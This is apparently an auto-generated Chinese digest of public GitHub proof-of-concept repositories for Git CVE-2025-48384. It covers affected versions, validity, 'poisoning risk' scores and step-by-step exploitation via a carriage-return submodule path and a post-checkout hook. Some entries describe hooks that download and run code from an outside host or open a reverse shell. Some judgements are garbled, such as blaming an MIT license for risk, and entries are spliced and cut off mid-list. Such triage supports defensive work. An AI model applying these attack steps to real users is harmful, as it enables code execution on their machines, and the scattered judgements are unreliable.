**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户执行恶意Git操作（例如，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，允许通过畸形的配置引用执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符时存在缺陷。具体来说，当Git写入配置条目时，如果值包含尾部的回车符（CR），则不会被正确引用。当后续读取配置时，尾部的CR会被删除，导致配置路径发生变化。

**利用方式：**

1.  攻击者创建一个包含恶意的`.gitmodules`文件的仓库。在这个文件中，子模块的路径包含一个尾部的回车符。
2.  攻击者设置一个符号链接，将经过修改的（尾部回车符被删除）子模块路径指向`.git/hooks`目录。
3.  攻击者在子模块中放置一个可执行的`post-checkout`钩子。
4.  受害者克隆该仓库并初始化子模块。
5.  当子模块初始化时，由于路径的更改以及符号链接的存在，`post-checkout`钩子会被执行，从而导致任意代码执行。

**POC有效性：**

提供的POC代码是一个`post-checkout`钩子脚本，它会尝试通过`curl`命令从`https://jarvis.webhop.me/pwned`下载并执行内容。这个脚本本身就是漏洞利用的一部分，当上述步骤成功执行时，该脚本将被执行，从而实现远程代码执行。

**投毒风险：**

提供的POC代码本身旨在利用该漏洞，因此不应将其视为潜在的投毒代码。然而，攻击者可以利用此漏洞传播恶意软件或执行其他恶意活动。此处的0%表示该代码片段本身没有隐藏其他恶意逻辑，它仅仅是利用该漏洞实现代码执行的载体。


**项目地址:** [mukesh-610/cve-2025-48384-exploit](https://github.com/mukesh-610/cve-2025-48384-exploit)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户检出包含恶意配置和submodule的仓库，且submodule包含恶意的post-checkout hook

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造包含恶意配置的Git仓库，实现在目标机器上执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符（CRLF）时存在缺陷。当Git读取配置值时，会去除尾部的CRLF，而当写入配置项时，如果值包含尾部CR，则不会进行引用，导致CR丢失。该漏洞利用方式如下：

1.  攻击者创建一个包含恶意配置的Git仓库，该配置会在submodule的路径中包含一个尾部的CR字符。
2.  攻击者创建一个submodule，并在submodule的`.git/hooks/post-checkout`文件中放置恶意脚本。
3.  攻击者创建一个指向恶意脚本的符号链接，该链接的目标路径经过CR处理后，会指向submodule的hooks目录。
4.  用户克隆包含恶意配置的仓库，并且递归初始化submodule，触发post-checkout钩子，执行恶意脚本，从而导致任意代码执行。

提供的POC代码是一个简单的`post-checkout`钩子脚本，它会在`/tmp`目录下创建一个名为`asp-was-here-cve-2025-48384`的文件。该脚本本身没有隐藏的投毒代码，只是用于验证漏洞是否成功利用。

根据搜索引擎的结果，该漏洞是真实存在的，并且有公开的PoC利用代码。多个安全厂商和社区都对此漏洞进行了分析和披露。

综合以上信息，可以得出结论：该漏洞利用是有效的，POC代码本身没有投毒风险，漏洞的利用方式是通过构造包含恶意配置和submodule的仓库，诱导用户克隆并初始化submodule，从而执行任意代码。

**项目地址:** [replicatorbot/CVE-2025-48384](https://github.com/replicatorbot/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git允许通过损坏的配置引用执行任意代码

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户克隆包含恶意配置的 Git 仓库，并递归初始化子模块。用户需要具有一定的权限，并且需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理包含回车符（CR）的配置值时存在不一致性。当读取配置值时，Git 会删除尾部的 CRLF。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被正确引用，导致在后续读取配置时丢失 CR。当初始化子模块时，如果子模块的路径包含尾部的 CR，则修改后的路径将被读取，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和搜索结果，此漏洞允许攻击者通过构造恶意 Git 仓库，在用户克隆仓库并初始化子模块时执行任意代码。提供的 POC 代码 `README.md` 仅包含基本的 Markdown 内容，本身不包含任何恶意代码或利用逻辑。但是，此`README.md`可能是一个更大 PoC 的一部分，用于展示漏洞仓库的结构。实际的利用需要构造包含带有恶意配置和 hook 的恶意仓库。

**投毒风险：**
提供的 POC 代码 `README.md` 文件本身没有投毒风险，但攻击者可能在其他文件中隐藏恶意代码，例如在 `.gitmodules` 文件或 submodule 的 post-checkout hook 中。如果攻击者修改了子模块的 hook 文件，并在其中添加了恶意代码，那么当用户克隆包含此子模块的仓库时，hook 脚本可能会被执行，从而导致任意代码执行。考虑到仅仅是一个`README.md`文件，其他的文件是否包含恶意代码，不得而知，无法完全排除风险。 投毒风险评估为10%。

**利用方式：**
1.  **创建恶意 Git 仓库：** 攻击者创建一个包含子模块的 Git 仓库。
2.  **修改 .gitmodules 文件：** 在 `.gitmodules` 文件中，将子模块的路径设置为包含尾部 CR 的路径。
3.  **创建符号链接：** 创建一个符号链接，将修改后的路径指向子模块的 `.git/hooks` 目录。
4.  **添加恶意 hook：** 在子模块的 `post-checkout` hook 中添加恶意代码。
5.  **诱导用户克隆仓库：** 诱导用户克隆恶意 Git 仓库并使用 `--recursive` 参数初始化子模块。
6.  **执行任意代码：** 当用户初始化子模块时，由于配置解析错误和符号链接的存在，恶意的 `post-checkout` hook 将被执行，从而导致任意代码执行。


**项目地址:** [s41r4j/CVE-2025-48384-submodule](https://github.com/s41r4j/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并执行包含submodule的操作，例如git submodule update --init --recursive

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是 Git 中一个高危漏洞，源于 Git 在处理配置文件时，对包含回车符 (CR) 的配置值的处理不一致。当 Git 读取配置值时，它会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被引用，导致在稍后读取配置时 CR 丢失。该漏洞利用方式为：

1.  **恶意仓库构建：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个 submodule 的路径，该路径以回车符结尾（例如，`submodule_path\r`）。
2.  **符号链接：** 攻击者在仓库中创建一个符号链接，将修改后的 submodule 路径（由于回车符被删除，变为 `submodule_path`）指向 `.git/hooks/post-checkout` 目录。
3.  **恶意钩子：** 攻击者在 submodule 中包含一个可执行的 `post-checkout` 钩子脚本，该脚本包含恶意代码。
4.  **诱导用户 clone：** 攻击者诱导受害者克隆该恶意仓库，并执行 `git submodule update --init --recursive` 命令。
5.  **代码执行：** 当执行 `git submodule update` 时，由于符号链接的存在，`post-checkout` 钩子脚本将被执行，从而导致任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的 PoC。提供的 Dockerfile 用于构建存在漏洞的 Git 版本（2.47.2），从而创建一个可用于验证漏洞的环境。README.md 文件详细解释了该漏洞，佐证了漏洞的存在。因此，该PoC有效。

**投毒风险评估：**
Dockerfile 仅用于构建易受攻击的 Git 环境，LICENSE 文件采用 MIT 许可，较为宽松，存在一定的风险。README.md 只是漏洞说明。整体评估投毒风险较低，约为10%。风险主要来源于LICENSE协议。

**利用方式总结：**
利用该漏洞需要攻击者精心构造一个恶意 Git 仓库，并诱导受害者克隆和执行特定命令。攻击的复杂性在于需要理解 Git 的配置处理机制和钩子机制，并巧妙地利用符号链接来实现代码执行。攻击者需要利用git config的解析缺陷，在submodule路径后添加\r字符，使submodule被clone到错误的位置，并使用软链接，将错误位置链接到.git/hooks目录下，在post-checkout阶段执行恶意代码

**项目地址:** [s41r4j/CVE-2025-48384](https://github.com/s41r4j/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并且执行带有漏洞的Git版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对换行符（CRLF）处理不当。当初始化子模块时，如果子模块的路径包含尾随的CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和PoC代码，该PoC是有效的。攻击者可以通过创建一个包含恶意配置的 Git 仓库，诱导用户克隆该仓库，从而触发漏洞并执行任意代码。

提供的PoC代码包含以下文件：
*   `README.md`: 简单的README文件，用于初始化子模块。
*   `post-checkout`: 一个shell脚本，用于执行任意命令，此处是`echo`和`id`命令。

**投毒风险：**
分析PoC代码，未发现作者隐藏的恶意代码。`post-checkout` 脚本的功能仅为打印 `id` 命令的执行结果，用于验证漏洞的存在。**因此，投毒风险为0%。**

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库。该仓库的子模块路径包含尾随CR字符。
2.  攻击者创建一个符号链接，将包含CR字符的子模块路径指向 `.git/hooks` 目录，或者子模块下的 `.git/hooks` 目录。
3.  攻击者将包含恶意代码的 `post-checkout` 脚本添加到子模块的 `.git/hooks` 目录中。
4.  攻击者诱导用户克隆该恶意 Git 仓库。
5.  当用户克隆仓库并初始化子模块时，由于Git对CR字符处理不当，子模块会被检出到错误的位置，同时 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**项目地址:** [Anezatraa/CVE-2025-48384-submodule](https://github.com/Anezatraa/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

